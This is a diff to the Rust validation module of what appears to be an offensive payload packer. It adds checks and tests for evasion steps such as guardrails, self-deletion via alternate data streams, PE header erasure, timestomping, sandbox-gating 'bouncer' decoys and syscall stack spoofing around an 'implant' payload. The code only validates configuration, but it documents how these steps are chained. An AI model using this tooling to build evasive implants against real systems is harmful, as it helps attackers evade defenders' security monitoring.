@@ -13,7 +13,7 @@ use crate::engine::polymorphism::PolymorphismMode;
 use crate::engine::syscalls::{SyscallsConfig, SyscallsMode};
 use crate::error::{PackerError, Result};
 use crate::techniques::network_stager::{self, Downloader};
-use crate::techniques::{Capability, Stability, TechniqueKind};
+use crate::techniques::{Capability, RuntimeStep, Stability, TechniqueKind};
 
 use super::schema::{Arch, DllEntry, OutputKind, PayloadFormat, Plan, StubPlan, Subsystem};
 use super::steps::{self, ResolvedPayload, ResolvedStep};
@@ -65,6 +65,8 @@ pub fn validate(plan: &Plan) -> Result<()> {
         }
         validate_bouncer(step)?;
         validate_drop(step)?;
+        validate_guardrail(step)?;
+        validate_self_deletion(step)?;
         validate_reflective_payload(step)?;
         validate_capabilities(plan, step)?;
         validate_sleep_obfuscation(step)?;
@@ -72,6 +74,7 @@ pub fn validate(plan: &Plan) -> Result<()> {
     }
 
     validate_api_resolution(plan, &steps)?;
+    validate_stack_spoofing(plan, &steps)?;
 
     Ok(())
 }
@@ -111,26 +114,18 @@ fn validate_asset_payload(step: &ResolvedStep, payload: &ResolvedPayload) -> Res
     Ok(())
 }
 
-/// Checks a `bouncer` decoy configuration that `serde` cannot express.
+/// Checks a `bouncer` configuration that `serde` cannot express.
 ///
 /// The presence of `decoy.payload` (and its existence in `build.payloads`) is
-/// already enforced by `steps::resolve`; this covers the destination path.
+/// already enforced by `steps::resolve`; the technique's own validation covers
+/// the patterns, the CIDRs, the empty lists and the `on_reject` combinations.
 fn validate_bouncer(step: &ResolvedStep) -> Result<()> {
     let TechniqueKind::Bouncer { params } = &step.technique else {
         return Ok(());
     };
-    if !params.is_decoy() {
-        return Ok(());
-    }
-    if let Some(decoy) = &params.decoy {
-        if decoy.path.trim().is_empty() {
-            return Err(PackerError::Validation(format!(
-                "step {} ('{}'): `params.decoy.path` must not be empty",
-                step.index, step.label
-            )));
-        }
-    }
-    Ok(())
+    params.validate().map_err(|message| {
+        PackerError::Validation(format!("step {} ('{}'): {message}", step.index, step.label))
+    })
 }
 
 /// Checks a `drop` step's destination. `params.payload` is enforced by
@@ -142,6 +137,112 @@ fn validate_drop(step: &ResolvedStep) -> Result<()> {
     if params.path.trim().is_empty() {
         return Err(PackerError::Validation(format!(
             "step {} ('{}'): `params.path` must not be empty",
+            step.index, step.label
+        )));
+    }
+    Ok(())
+}
+
+/// Checks a `guardrail` step's gate parameters.
+///
+/// The stub compares `expire_on` lexicographically, so a date in any other shape
+/// than `YYYY-MM-DD` silently disables the deadline; and the run counter is a
+/// file named from `run_key` under the temporary directory, so a path-like value
+/// could escape it and truncate an arbitrary file.
+fn validate_guardrail(step: &ResolvedStep) -> Result<()> {
+    let TechniqueKind::Guardrail { params } = &step.technique else {
+        return Ok(());
+    };
+    if let Some(expire_on) = params.expire_on.as_deref() {
+        if !is_iso_date(expire_on) {
+            return Err(PackerError::Validation(format!(
+                "step {} ('{}'): 'guardrail' `params.expire_on` '{expire_on}' is not a valid \
+                 YYYY-MM-DD date; the stub compares it lexicographically, so another format would \
+                 silently disable the deadline",
+                step.index, step.label
+            )));
+        }
+    }
+    if params.run_key.trim().is_empty() {
+        return Err(PackerError::Validation(format!(
+            "step {} ('{}'): 'guardrail' `params.run_key` must not be empty",
+            step.index, step.label
+        )));
+    }
+    if params.run_key.contains(['\\', '/', ':'])
+        || params.run_key.contains("..")
+        || std::path::Path::new(&params.run_key).is_absolute()
+    {
+        return Err(PackerError::Validation(format!(
+            "step {} ('{}'): 'guardrail' `params.run_key` '{key}' must be a plain file name: no \
+             separators, drive/stream separator or '..' (it is joined to the temporary directory)",
+            step.index,
+            step.label,
+            key = params.run_key
+        )));
+    }
+    Ok(())
+}
+
+/// Whether `value` is exactly an ISO `YYYY-MM-DD` calendar date.
+fn is_iso_date(value: &str) -> bool {
+    let bytes = value.as_bytes();
+    if bytes.len() != 10 || bytes[4] != b'-' || bytes[7] != b'-' {
+        return false;
+    }
+    let number = |range: std::ops::Range<usize>| -> Option<u32> {
+        let text = value.get(range)?;
+        if !text.bytes().all(|b| b.is_ascii_digit()) {
+            return None;
+        }
+        text.parse().ok()
+    };
+    let (Some(year), Some(month), Some(day)) = (number(0..4), number(5..7), number(8..10)) else {
+        return false;
+    };
+    let leap = (year % 4 == 0 && year % 100 != 0) || year % 400 == 0;
+    let last_day = match month {
+        1 | 3 | 5 | 7 | 8 | 10 | 12 => 31,
+        4 | 6 | 9 | 11 => 30,
+        2 if leap => 29,
+        2 => 28,
+        _ => return false,
+    };
+    (1..=last_day).contains(&day)
+}
+
+/// Checks a `self_deletion` step's alternate data stream name.
+///
+/// The stub appends the stream to the running image's own path, so a value
+/// without the leading `:` is not a stream at all, and a path separator or NUL
+/// would address a different file (or truncate the name).
+fn validate_self_deletion(step: &ResolvedStep) -> Result<()> {
+    let TechniqueKind::SelfDeletion { params } = &step.technique else {
+        return Ok(());
+    };
+    if params.mode != crate::techniques::self_deletion::Mode::RenameAds {
+        return Ok(());
+    }
+    let Some(stream) = params.stream.as_deref() else {
+        return Ok(());
+    };
+    let Some(name) = stream.strip_prefix(':') else {
+        return Err(PackerError::Validation(format!(
+            "step {} ('{}'): 'self_deletion' `params.stream` '{stream}' must start with ':' (it is \
+             an alternate data stream name, not a path)",
+            step.index, step.label
+        )));
+    };
+    if name.is_empty() {
+        return Err(PackerError::Validation(format!(
+            "step {} ('{}'): 'self_deletion' `params.stream` '{stream}' names an empty stream",
+            step.index, step.label
+        )));
+    }
+    if stream.contains(['\\', '/', '\0']) {
+        return Err(PackerError::Validation(format!(
+            "step {} ('{}'): 'self_deletion' `params.stream` '{stream}' must not contain a path \
+             separator or NUL",
             step.index, step.label
         )));
     }
@@ -464,12 +565,35 @@ fn validate_dll_like(plan: &Plan, steps: &[ResolvedStep]) -> Result<()> {
                 step.index, step.label, output.kind.label()
             )));
         }
-        if let TechniqueKind::Bouncer { params } = &step.technique {
-            if params.on_fail == crate::techniques::bouncer::OnFail::Exit {
+        if matches!(&step.technique, TechniqueKind::ErasePeHeader { .. }) {
+            return Err(PackerError::Validation(format!(
+                "step {} ('{}') is 'erase_pe_header' and build.output.kind is '{}': the technique \
+                 zeroes the header at `GetModuleHandleA(NULL)`, which in a DLL or shellcode build \
+                 is the *host's* image — it would erase the interpreter's PE header",
+                step.index,
+                step.label,
+                output.kind.label()
+            )));
+        }
+        if let TechniqueKind::Timestomping { params } = &step.technique {
+            if params.target.is_none() {
                 return Err(PackerError::Validation(format!(
-                    "step {} ('{}') is 'bouncer' with `on_fail: exit` and build.output.kind is \
-                     '{}': `std::process::exit` would kill the host process. Use `on_fail: \
-                     silent`",
+                    "step {} ('{}') is 'timestomping' with no explicit `target` and \
+                     build.output.kind is '{}': it resolves `std::env::current_exe()`, which in a \
+                     DLL or shellcode build is the host executable. Set `params.target` to the file \
+                     the step should stomp",
+                    step.index,
+                    step.label,
+                    output.kind.label()
+                )));
+            }
+        }
+        if let TechniqueKind::Bouncer { params } = &step.technique {
+            if params.on_reject.exits_process() {
+                return Err(PackerError::Validation(format!(
+                    "step {} ('{}') is 'bouncer' with an `on_reject` action that calls \
+                     `std::process::exit` and build.output.kind is '{}': it would kill the host \
+                     process. Use `action: abort`, or `action: decoy` with `exit_code: 0`",
                     step.index,
                     step.label,
                     output.kind.label()
@@ -603,6 +727,18 @@ fn validate_psmodule(plan: &Plan, steps: &[ResolvedStep]) -> Result<()> {
     Ok(())
 }
 
+/// The reserved and strict keywords of Rust 2021 plus the lone `_` wildcard.
+///
+/// `validate_export_name` accepts a C identifier; a keyword passes that check
+/// and then fails `rustc` deep in the generated stub, so it is rejected here.
+const RUST_KEYWORDS: &[&str] = &[
+    "_", "abstract", "as", "async", "await", "become", "box", "break", "const", "continue",
+    "crate", "do", "dyn", "else", "enum", "extern", "false", "final", "fn", "for", "gen", "if",
+    "impl", "in", "let", "loop", "macro", "match", "mod", "move", "mut", "override", "priv", "pub",
+    "ref", "return", "self", "Self", "static", "struct", "super", "trait", "true", "try", "type",
+    "typeof", "unsafe", "unsized", "use", "virtual", "where", "while", "yield",
+];
+
 /// The plain export a `kind: dll` build declares must be a C identifier and must
 /// not collide with the entry points the build itself emits.
 fn validate_export_name(name: &str) -> Result<()> {
@@ -627,6 +763,12 @@ fn validate_export_name(name: &str) -> Result<()> {
         return Err(PackerError::Validation(format!(
             "build.output.entry export name '{name}' collides with an entry point the build already \
              emits; pick another name"
+        )));
+    }
+    if RUST_KEYWORDS.contains(&name) {
+        return Err(PackerError::Validation(format!(
+            "build.output.entry export name '{name}' is a Rust keyword; the generated stub would \
+             not compile. Pick a plain identifier, e.g. `export:Run`"
         )));
     }
     Ok(())
@@ -685,17 +827,10 @@ pub fn advisories(plan: &Plan) -> Vec<String> {
         match &step.technique {
             TechniqueKind::Bouncer { params } if params.is_noop() => {
                 warnings.push(
-                    "bouncer: no check field is declared, so the technique is a no-op and will \
-                     never abort the pipeline"
+                    "bouncer: neither `require`/`any_of` nor `anti_analysis` declares a check, so \
+                     the technique is a no-op and will never abort the pipeline"
                         .to_string(),
                 );
-            }
-            TechniqueKind::Bouncer { params } if params.decoy.is_some() && !params.is_decoy() => {
-                warnings.push(format!(
-                    "step {}: 'bouncer' declares a `params.decoy` but `on_fail` is not 'decoy', so \
-                     the decoy is never written",
-                    step.index
-                ));
             }
             TechniqueKind::PatchEtw { .. } => patched_ntdll_text = true,
             TechniqueKind::PatchAmsi { .. } => patched_amsi = true,
@@ -815,6 +950,13 @@ pub fn advisories(plan: &Plan) -> Vec<String> {
             warnings.push(
                 "build.stub.api_resolution.unmatched is 'abort': the loader will fail on any \
                  payload import outside the catalogue (a strict allowlist / debugging posture)"
+                    .to_string(),
+            );
+        }
+        if config.hooks.sleep.is_some() {
+            warnings.push(
+                "build.stub.api_resolution.hooks.sleep intercepts `Sleep` (and its API-set alias) \
+                 only: `SleepEx`, a direct `NtDelayExecution`, and waits on objects are plain delays"
                     .to_string(),
             );
         }
@@ -1039,6 +1181,19 @@ fn validate_api_resolution(plan: &Plan, steps: &[ResolvedStep]) -> Result<()> {
              the payload runs, so the payload's IAT there can only point at the real exports. Use \
              reflective_loading (the payload runs in the loader's process). See \
              docs/api-resolution.md (Phase E)."
+                .to_string(),
+        ));
+    }
+
+    // The Sleep hook conceals the *mapped payload*: only the in-process mapper
+    // records that region, and only reflective_loading can host the proxies.
+    if config.hooks.sleep.is_some()
+        && !matches!(step.technique, TechniqueKind::ReflectiveLoading { .. })
+    {
+        return Err(PackerError::Validation(
+            "build.stub.api_resolution.hooks.sleep needs reflective_loading: the loader records \
+             the mapped payload image there, and the hook encrypts exactly that region while the \
+             payload sleeps"
                 .to_string(),
         ));
     }
@@ -1352,6 +1507,13 @@ fn validate_syscalls_arch(plan: &Plan) -> Result<()> {
         return Ok(());
     }
     let syscalls = SyscallsConfig::from_yaml(plan.build.stub.syscalls.as_ref())?;
+    if syscalls.stack_spoofing.is_some() {
+        return Err(PackerError::Validation(
+            "build.stub.syscalls.stack_spoofing is x86_64-only: the fabricated frames and the \
+             syscall trampoline are x64. Use build.output.arch: x64"
+                .to_string(),
+        ));
+    }
     if syscalls.mode == SyscallsMode::Indirect {
         return Err(PackerError::Validation(
             "build.stub.syscalls.mode 'indirect' is x64-only for now: the trampoline is x64 (x86 \
@@ -1367,6 +1529,32 @@ fn validate_syscalls_arch(plan: &Plan) -> Result<()> {
 /// Only the ekko variant and the `[payload]` region list are implemented in
 /// this phase; the other values parse fine but are rejected here with a
 /// pointer to the missing phase.
+/// Validates `stack_spoofing` beyond its mode/arch checks.
+///
+/// The block rewrites the trampoline the `nt_*` helpers call; a build with no
+/// technique or proxy that uses the syscall layer has nothing to spoof, so the
+/// block would be emitted into a no-op layer (or not at all). Fail loudly.
+fn validate_stack_spoofing(plan: &Plan, steps: &[ResolvedStep]) -> Result<()> {
+    let config = SyscallsConfig::from_yaml(plan.build.stub.syscalls.as_ref())?;
+    if config.stack_spoofing.is_none() {
+        return Ok(());
+    }
+
+    let union: Vec<RuntimeStep> = steps
+        .iter()
+        .map(|step| RuntimeStep::new(step.technique.clone()))
+        .collect();
+    let api = ApiResolutionConfig::from_yaml(plan.build.stub.api_resolution.as_ref())?;
+    if crate::engine::syscalls::required(&union).is_empty() && api.required_syscalls().is_empty() {
+        return Err(PackerError::Validation(
+            "build.stub.syscalls.stack_spoofing needs at least one nt_* call: no technique or API \
+             proxy uses the syscall layer, so there is no trampoline to spoof"
+                .to_string(),
+        ));
+    }
+    Ok(())
+}
+
 fn validate_sleep_obfuscation(step: &ResolvedStep) -> Result<()> {
     let TechniqueKind::SleepObfuscation { params } = &step.technique else {
         return Ok(());
@@ -1759,6 +1947,30 @@ mod tests {
     }
 
     #[test]
+    fn stack_spoofing_is_a_syscalls_feature_not_a_step() {
+        let plan = parse(&with_stub(
+            "    syscalls:\n      mode: indirect\n      stack_spoofing:\n        decoy_bytes: 4096\n",
+        ));
+        validate(&plan).expect("the block is valid with indirect syscalls");
+    }
+
+    #[test]
+    fn stack_spoofing_is_x64_only() {
+        let yaml = with_stub("    syscalls:\n      mode: indirect\n      stack_spoofing: {}\n")
+            .replace("arch: x64", "arch: x86");
+        let err = validate(&parse(&yaml)).expect_err("x86 stack spoofing");
+        assert!(err.to_string().contains("x86_64-only"), "unclear: {err}");
+    }
+
+    #[test]
+    fn stack_spoofing_is_not_a_runtime_step() {
+        let yaml =
+            with_runtime("  - technique: stack_spoofing\n  - technique: reflective_loading\n");
+        let err = serde_yml::from_str::<Plan>(&yaml).expect_err("the old step must not parse");
+        assert!(err.to_string().contains("stack_spoofing"), "unclear: {err}");
+    }
+
+    #[test]
     fn proxy_requires_indirect_syscalls() {
         let plan = parse(&with_stub(
             "    syscalls: { mode: none }\n    api_resolution: { mode: proxy, apis: [\"ntdll!NtReadVirtualMemory\"] }",
@@ -1804,6 +2016,30 @@ mod tests {
         );
         let err = validate(&plan).expect_err("proxy with two loads");
         assert!(err.to_string().contains("proxy"), "unclear: {err}");
+    }
+
+    #[test]
+    fn accepts_the_sleep_hook_with_reflective_loading() {
+        let plan = parse(&with_stub(
+            "    syscalls: { mode: indirect }\n    api_resolution:\n      mode: proxy\n      hooks:\n        sleep:\n          assume_single_threaded: true\n",
+        ));
+        validate(&plan).expect("the hook is valid with reflective_loading");
+    }
+
+    #[test]
+    fn sleep_hook_rejects_a_non_reflective_execution() {
+        // `process_ghosting` accepts a PE payload and is not covered by the
+        // hollowing/injection rejection, so this reaches the hook's own check.
+        let plan = parse(&plan_yaml(
+            "  stub:\n    syscalls: { mode: indirect }\n    api_resolution:\n      mode: proxy\n      hooks:\n        sleep:\n          assume_single_threaded: true\n",
+            "",
+            "  - technique: process_ghosting\n",
+        ));
+        let err = validate(&plan).expect_err("the hook needs the region registry");
+        assert!(
+            err.to_string().contains("reflective_loading"),
+            "unclear: {err}"
+        );
     }
 
     // --- sign ---
@@ -1939,7 +2175,7 @@ mod tests {
     #[test]
     fn no_advisory_when_bouncer_declares_a_check() {
         let plan = parse(&with_runtime(
-            "  - technique: bouncer\n    params: { min_ram_mb: 512 }\n  - technique: reflective_loading\n",
+            "  - technique: bouncer\n    params: { require: [{ ram_mb: 512 }] }\n  - technique: reflective_loading\n",
         ));
         let warnings = advisories(&plan);
         assert!(
@@ -2147,7 +2383,7 @@ mod tests {
     fn rejects_bouncer_exit_with_a_dll() {
         let plan = parse(&with_dll(
             "",
-            "  - technique: bouncer\n    params: { hostname: host, on_fail: exit }\n  - technique: reflective_loading\n",
+            "  - technique: bouncer\n    params: { require: [{ hostname: host }], on_reject: { action: exit } }\n  - technique: reflective_loading\n",
         ));
         let err = validate(&plan).expect_err("expected a validation error");
         assert!(
@@ -2156,9 +2392,181 @@ mod tests {
         );
     }
 
+    #[test]
+    fn rejects_erase_pe_header_with_a_dll() {
+        let plan = parse(&with_dll(
+            "",
+            "  - technique: erase_pe_header\n  - technique: reflective_loading\n",
+        ));
+        let err = validate(&plan).expect_err("the host owns the image");
+        assert!(
+            err.to_string().contains("erase_pe_header"),
+            "unclear error: {err}"
+        );
+        assert!(err.to_string().contains("host"), "unclear error: {err}");
+    }
+
+    #[test]
+    fn rejects_erase_pe_header_with_shellcode() {
+        let plan = parse(&with_shellcode(
+            "    entry: export:Run\n",
+            "  - technique: erase_pe_header\n  - technique: reflective_loading\n",
+        ));
+        let err = validate(&plan).expect_err("the host owns the image");
+        assert!(
+            err.to_string().contains("erase_pe_header"),
+            "unclear error: {err}"
+        );
+    }
+
+    #[test]
+    fn rejects_a_timestomp_without_a_target_in_a_dll() {
+        let plan = parse(&with_dll(
+            "",
+            "  - technique: timestomping\n    params: { reference: 'C:\\Windows\\System32\\kernel32.dll' }\n  - technique: reflective_loading\n",
+        ));
+        let err = validate(&plan).expect_err("current_exe is the host");
+        assert!(
+            err.to_string().contains("timestomping"),
+            "unclear error: {err}"
+        );
+        assert!(err.to_string().contains("target"), "unclear error: {err}");
+    }
+
+    #[test]
+    fn accepts_a_timestomp_with_an_explicit_target_in_a_dll() {
+        let plan = parse(&with_dll(
+            "",
+            "  - technique: timestomping\n    params: { reference: 'C:\\Windows\\System32\\kernel32.dll', target: 'C:\\drop\\x.bin' }\n  - technique: reflective_loading\n",
+        ));
+        validate(&plan).expect("an explicit target does not touch the host image");
+    }
+
+    #[test]
+    fn rejects_rust_keywords_as_export_names() {
+        for name in ["fn", "self", "crate", "_"] {
+            let plan = parse(&with_dll(
+                &format!("    entry: export:{name}\n"),
+                dll_runtime(),
+            ));
+            let err = validate(&plan).expect_err("a keyword would not compile");
+            assert!(
+                err.to_string().contains("Rust keyword"),
+                "{name}: unclear error: {err}"
+            );
+        }
+    }
+
+    // --- guardrail ---
+
+    fn with_guardrail(params: &str) -> String {
+        with_runtime(&format!(
+            "  - technique: guardrail\n    params: {params}\n  - technique: reflective_loading\n"
+        ))
+    }
+
+    #[test]
+    fn accepts_a_valid_guardrail() {
+        let plan = parse(&with_guardrail(
+            "{ expire_on: '2028-02-29', max_runs: 3, run_key: runs }",
+        ));
+        validate(&plan).expect("a leap day and a plain file name are valid");
+    }
+
+    #[test]
+    fn rejects_a_guardrail_date_that_is_not_iso() {
+        for date in ["2027/01/01", "2027-1-1", "2027-13-01", "2027-02-30"] {
+            let plan = parse(&with_guardrail(&format!("{{ expire_on: '{date}' }}")));
+            let err = validate(&plan).expect_err("not an ISO calendar date");
+            assert!(
+                err.to_string().contains("expire_on"),
+                "{date}: unclear error: {err}"
+            );
+        }
+    }
+
+    #[test]
+    fn rejects_a_guardrail_run_key_that_escapes_the_temp_directory() {
+        for key in ["../escape", "sub/x", "sub\\\\x", "C:\\x", ".."] {
+            let plan = parse(&with_guardrail(&format!("{{ run_key: '{key}' }}")));
+            let err = validate(&plan).expect_err("a path-like run key");
+            assert!(
+                err.to_string().contains("run_key"),
+                "{key}: unclear error: {err}"
+            );
+        }
+    }
+
+    #[test]
+    fn rejects_an_empty_guardrail_run_key() {
+        let plan = parse(&with_guardrail("{ run_key: ' ' }"));
+        let err = validate(&plan).expect_err("an empty file name");
+        assert!(err.to_string().contains("run_key"), "unclear error: {err}");
+    }
+
+    // --- self_deletion ---
+
+    fn with_self_deletion(params: &str) -> String {
+        with_runtime(&format!(
+            "  - technique: self_deletion\n    params: {params}\n  - technique: reflective_loading\n"
+        ))
+    }
+
+    #[test]
+    fn accepts_a_valid_self_deletion_stream() {
+        let plan = parse(&with_self_deletion("{ stream: ':hidden' }"));
+        validate(&plan).expect("a colon-prefixed stream name is valid");
+    }
+
+    #[test]
+    fn rejects_a_self_deletion_stream_without_a_colon() {
+        let plan = parse(&with_self_deletion("{ stream: hidden }"));
+        let err = validate(&plan).expect_err("not a stream name");
+        assert!(err.to_string().contains("stream"), "unclear error: {err}");
+    }
+
+    #[test]
+    fn rejects_a_self_deletion_stream_that_is_only_the_colon() {
+        let plan = parse(&with_self_deletion("{ stream: ':' }"));
+        let err = validate(&plan).expect_err("an empty stream");
+        assert!(err.to_string().contains("stream"), "unclear error: {err}");
+    }
+
+    #[test]
+    fn rejects_a_self_deletion_stream_with_a_separator() {
+        for stream in [":a/b", ":a\\b"] {
+            let plan = parse(&with_self_deletion(&format!("{{ stream: '{stream}' }}")));
+            let err = validate(&plan).expect_err("a path separator");
+            assert!(
+                err.to_string().contains("stream"),
+                "{stream}: unclear error: {err}"
+            );
+        }
+    }
+
+    #[test]
+    fn the_self_deletion_stream_check_is_rename_ads_only() {
+        let plan = parse(&with_self_deletion("{ mode: helper, stream: hidden }"));
+        validate(&plan).expect("helper mode does not use the stream");
+    }
+
+    #[test]
+    fn advises_on_self_deletion_after_image_path_spoofing() {
+        let plan = parse(&with_runtime(
+            "  - technique: image_path_spoofing\n    params: { path: 'C:\\Windows\\System32\\svchost.exe' }\n  - technique: self_deletion\n  - technique: reflective_loading\n",
+        ));
+        let warnings = advisories(&plan);
+        assert!(
+            warnings
+                .iter()
+                .any(|w| w.contains("self_deletion") && w.contains("decoy")),
+            "expected a self-deletion advisory: {warnings:?}"
+        );
+    }
+
     // --- bouncer decoy ---
 
-    const DECOY_PLAN: &str = "schema: 6\nname: t\nbuild:\n  crypto: { algo: xchacha20poly1305, key: random }\n  payloads:\n    implant: { source: ./p.exe, format: pe }\n    doc: { source: ./d.bin, format: FORMAT }\n  output: { path: ./dist/o.exe, arch: x64, strip: true, trim_paths: all }\nruntime:\n  - technique: bouncer\n    params: { on_fail: decoy, hostname: h, decoy: { path: x, payload: doc } }\n  - technique: reflective_loading\n    params: { payload: implant }\n";
+    const DECOY_PLAN: &str = "schema: 6\nname: t\nbuild:\n  crypto: { algo: xchacha20poly1305, key: random }\n  payloads:\n    implant: { source: ./p.exe, format: pe }\n    doc: { source: ./d.bin, format: FORMAT }\n  output: { path: ./dist/o.exe, arch: x64, strip: true, trim_paths: all }\nruntime:\n  - technique: bouncer\n    params: { require: [{ hostname: h }], on_reject: { action: decoy, decoy: { path: x, payload: doc } } }\n  - technique: reflective_loading\n    params: { payload: implant }\n";
 
     #[test]
     fn accepts_a_plain_bouncer_decoy() {
@@ -2176,7 +2584,7 @@ mod tests {
     #[test]
     fn a_bouncer_decoy_without_a_payload_is_rejected() {
         let plan = parse(&with_runtime(
-            "  - technique: bouncer\n    params: { on_fail: decoy, hostname: h }\n  - technique: reflective_loading\n",
+            "  - technique: bouncer\n    params: { require: [{ hostname: h }], on_reject: { action: decoy } }\n  - technique: reflective_loading\n",
         ));
         let err = validate(&plan).expect_err("decoy without a payload");
         assert!(err.to_string().contains("decoy"), "unclear: {err}");
@@ -2221,7 +2629,7 @@ mod tests {
     /// then run the payload — a `kind: dll` build with `reflective_loading`.
     #[test]
     fn a_drop_bouncer_reflective_pipeline_is_valid() {
-        let yaml = "schema: 6\nname: t\nbuild:\n  crypto: { algo: xchacha20poly1305, key: random }\n  payloads:\n    implant: { source: ./p.dll, format: dll, export: Run }\n    doc: { source: ./d.bin, format: plain }\n  output: { path: ./dist/o.dll, kind: dll }\nruntime:\n  - technique: drop\n    params: { path: \"TEST.docx\", payload: doc }\n  - technique: bouncer\n    params: { on_fail: silent, processes: [{ name: calc.exe, state: present }] }\n  - technique: reflective_loading\n    params: { payload: implant }\n";
+        let yaml = "schema: 6\nname: t\nbuild:\n  crypto: { algo: xchacha20poly1305, key: random }\n  payloads:\n    implant: { source: ./p.dll, format: dll, export: Run }\n    doc: { source: ./d.bin, format: plain }\n  output: { path: ./dist/o.dll, kind: dll }\nruntime:\n  - technique: drop\n    params: { path: \"TEST.docx\", payload: doc }\n  - technique: bouncer\n    params: { require: [{ process: { name: calc.exe, state: present } }] }\n  - technique: reflective_loading\n    params: { payload: implant }\n";
         validate(&parse(yaml)).expect("the drop + bouncer + reflective pipeline is valid");
     }
 
